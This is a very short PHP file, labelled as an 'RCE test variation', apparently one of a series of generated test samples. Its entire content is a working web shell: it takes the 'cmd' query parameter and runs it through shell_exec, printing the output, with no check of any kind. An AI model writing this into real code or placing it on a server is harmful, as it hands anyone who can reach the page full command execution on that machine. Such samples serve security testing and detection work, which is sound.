<?php
// RCE test variation #269
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>